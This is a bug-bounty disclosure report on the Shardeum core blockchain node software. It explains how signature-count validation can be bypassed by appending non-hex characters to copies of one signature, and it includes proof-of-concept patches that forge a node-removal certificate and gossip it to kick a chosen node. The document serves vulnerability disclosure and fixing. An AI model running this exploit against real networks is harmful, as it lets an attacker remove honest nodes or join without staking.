# #39679 \[BC-Critical] bypass certificate signing validation by double counting signatures

## #39679 \[BC-Critical] Bypass certificate signing validation by double counting signatures due to ignored suffixes

**Submitted on Feb 4th 2025 at 18:39:02 UTC by @Blockian for** [**Audit Comp | Shardeum: Core III**](https://immunefi.com/audit-competition/audit-comp-shardeum-core-iii)

* **Report ID:** #39679
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/shardeum/shardus-core/tree/bugbounty>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)
  * Bypassing Staking Requirements

### Description

### Impact

1. Bypass stake certificate validation, allowing for non-staking nodes and network take-over
2. Bypass nodes removal validation, allowing to remove nodes from the network

* Note: same impact as reports [`33222`](https://reports.immunefi.com/shardeum-core/33222-bc-critical-an-attacker-can-control-which-nodes-can-and-can...) and [34252](https://reports.immunefi.com/shardeum-core/34252-bc-critical-bypass-certificate-signing-validation) but a different root cause.

### Root Cause

The function `validateClosestActiveNodeSignatures` counts unique signatures, but double counts duplicate signatures with different suffixes that aren't valid hex characters.

### Attack Flow

#### Staking

* Malicious node generates a fake `JoinRequest` with a fake `StakingCertificate`
  * It brute-forces `StakingCertificate` fields to make sure its one of the closest nodes to the hash of the staking certificates. This is easy, as only 1 node is needed to be close.
* It creates the full `JoinRequest`, with multiple copies of its signature, instead of signatures from many other nodes, changing only the suffix of the signature with invalid non-hex bytes.
* It calls `gossip-join-request`
* Other nodes receive the join request, and validate it using `validateClosestActiveNodeSignatures`.
* The validation bypasses, as the signatures are valid because non-hex characters are ignored.
* The new node joins the network without staking.

#### Kicking a node

* Malicious node generates a fake `RemoveCertificate`.
* It fills it with multiple copies of its signature, instead of signatures from many other nodes, changing only the suffix of the signature with invalid non-hex bytes.
* It calls `remove-by-app` gossip route.
* Other nodes receive the certificate, and validate it using `validateClosestActiveNodeSignatures`.
* The validation bypasses, as the signatures are valid because non-hex characters are ignored.
* The victim node is kicked from the network.

### Deep Dive

The function [`validateClosestActiveNodeSignatures`](https://github.com/shardeum/core/blob/bugbounty/src\shardus\index.ts#L1975-L1975) uses [`Crypto.verify`](https://github.com/shardeum/core/blob/bugbounty/src\crypto\index.ts#L203-L203) which uses [`lib-crypto-utils`](https://github.com/shardeum/lib-crypto-utils/)' [`verifyObj`](https://github.com/shardeum/lib-crypto-utils/blob/bugbounty/src\index.ts#L442-L442) which calls [`verify`](https://github.com/shardeum/lib-crypto-utils/blob/bugbounty/src\index.ts#L416-L416) which calls [`ensureBuffer`](https://github.com/shardeum/lib-crypto-utils/blob/bugbounty/src\index.ts#L488-L488) on the signature which [runs](https://github.com/shardeum/lib-crypto-utils/blob/bugbounty/src\index.ts#L488-L488)

```js
Buffer.from(input, 'hex')
```

on the signatures, which reads up until the first non-hex character.

### Suggested Fix

I suggest to do two think:

1. Ensure "is-hex" on any payload on any gossip and http endpoint that is supposed to be hex.
2. Count signers and not signatures.

### Severity

This allows to take over the network (by kicking nodes / adding nodes) and so it critical.\
In addition, this is the same as [`33222`](https://reports.immunefi.com/shardeum-core/33222-bc-critical-an-attacker-can-control-which-nodes-can-and-can...) and [34252](https://reports.immunefi.com/shardeum-core/34252-bc-critical-bypass-certificate-signing-validation) which were treated as critical.

## Message to the project

I feel like my time was spent roughly 20% on researching, and 80% on trying to create POCs that match your standard or to answer question you give on the reported bugs. I believe there are more bugs to be found in the project, and that the current approach is the reason that bugs keep being found. I suggest you do an invite only competition, without defaultly requesting a POC, and only requesting one if you truly believe there is no bug. This would allow whitehats to actually uncover bugs.

### Proof of Concept

### POC

Note: this strongly relies on `infosec_us_team`'s POC for [`33222`](https://reports.immunefi.com/shardeum-core/33222-bc-critical-an-attacker-can-control-which-nodes-can-and-can...) so thanks to them :)

1. Both `shardeum` and `core` should be on the `bugbounty` branch
2. Apply `debug-10-nodes` as stated in the docs
3. Apply the following patch on core:

```diff
diff --git a/src/shardus/index.ts b/src/shardus/index.ts
index f29206b8..567292be 100644
--- a/src/shardus/index.ts
+++ b/src/shardus/index.ts
@@ -3408,6 +3408,50 @@ class Shardus extends EventEmitter {
   isOnStandbyList(publicKey: string): boolean {
     return JoinV2.isOnStandbyList(publicKey)
   }
+
+  async blockian_gossipRemoveNode(pk: string): Promise<string> {
+    let thenodes = nodeListFromStates([
+      P2P.P2PTypes.NodeStatus.ACTIVE,
+      P2P.P2PTypes.NodeStatus.READY,
+      P2P.P2PTypes.NodeStatus.SYNCING,
+    ]);
+    this.mainLogger.warn(`BLOCKIAN: Trying to disconnect him: ${pk}`)
+    console.log(`BLOCKIAN: Trying to disconnect him: ${pk}`)
+    let certificate: P2P.LostTypes.RemoveCertificate = {
+      nodePublicKey: pk, // Victim node
+      cycle: CycleCreator.currentCycle - 2,
+    };
+    const hash = crypto.hashObj(certificate)
+    const closestNodes = this.getClosestNodes(hash, 6);
+    const closestNodesByPubKey = new Map()
+    for (let i = 0; i < closestNodes.length; i++) {
+      const node = this.p2p.state.getNode(closestNodes[i])
+      if (node) {
+        closestNodesByPubKey.set(node.publicKey, node)
+      }
+    }
+    let ourPublicKey = Self.getPublicNodeInfo(true).publicKey;
+    if (!closestNodesByPubKey.has(ourPublicKey)) {
+      this.mainLogger.warn(`BLOCKIAN: WE ARE NOT in the closest nodes list.`)
+      console.log(`BLOCKIAN: WE ARE NOT in the closest nodes list.`)
+      return "BLOCKIAN: WE ARE NOT in the closest nodes list.";
+    }
+    let oursig = this.crypto.sign(certificate).sign;
+    certificate.signs = Array.from({ length: 9 }, (_, i) => ({
+      owner: oursig.owner,
+      sig: oursig.sig.toLowerCase() + 'z'.repeat(i + 1),
+    }));
+        
+    Comms.sendGossip(
+      'remove-by-app',
+      certificate, // payload
+      'trackthis', // tracker
+      Self.id, // sender
+      thenodes
+    )
+    console.log(`BLOCKIAN: Final object we are going to send: ${JSON.stringify(certificate)}`);
+    return `Success: Current Quarter ${currentQuarter} (it only works during Quarter 1 and 2 of each cycle)`;
+  }
 }
 
 function deepReplace(obj: object | ArrayLike<any>, find: any, replace: any): any {
```

4. Apply the following patch on `shardeum` (obviously the logs are just for convenience)

```diff
diff --git a/src/index.ts b/src/index.ts
index 22fb7ae9..a39f5e09 100644
--- a/src/index.ts
+++ b/src/index.ts
@@ -2378,7 +2378,7 @@ const configShardusEndpoints = (): void => {
   })
 
   // endpoint on joining nodes side to receive admin certificate
-  shardus.registerExternalPut('admin-certificate', externalApiMiddleware, async (req, res) => {
+  shardus.registerExternalPut('admin-certificate', externalApiMiddleware, async (req: Request, res) => {
     try {
       nestedCountersInstance.countEvent('shardeum-admin-certificate', 'called PUT admin-certificate')
 
@@ -2409,6 +2409,13 @@ const configShardusEndpoints = (): void => {
     nestedCountersInstance.countEvent('endpoint', 'health-check')
     res.sendStatus(200)
   })
+
+  shardus.registerExternalGet('blockian_gossipRemoveNode', externalApiMiddleware, async (req, res) => {
+    const pk = req.query.pk as string;
+    console.log(`BLOCKIAN: Target pk: ${pk}`);
+    const result: string = await shardus.blockian_gossipRemoveNode(pk);
+    res.json(`BLOCKIAN: All good. Result: ${result}`);
+  })
 }
 
 const configShardusNetworkTransactions = (): void => {
diff --git a/src/shardeum/shardeumFlags.ts b/src/shardeum/shardeumFlags.ts
index de85df9c..2a7221d4 100644
--- a/src/shardeum/shardeumFlags.ts
+++ b/src/shardeum/shardeumFlags.ts
@@ -132,7 +132,7 @@ export const ShardeumFlags: ShardeumFlags = {
   contractStoragePrefixBitLength: 3,
   contractCodeKeySilo: false,
   globalCodeBytes: false,
-  VerboseLogs: false,
+  VerboseLogs: true,
   debugTraceLogs: false,
   Virtual0Address: true,
   GlobalNetworkAccount: true,

```

5. Run`http://NODE_EXTERNAL_IP:NODE_EXTERNAL_PORT/blockian_gossipRemoveNode/?pk=PUBLIC_KEY_OF_ACTIVE_NODE_WITHIN_YOUR_SHARD_TO_KICK`
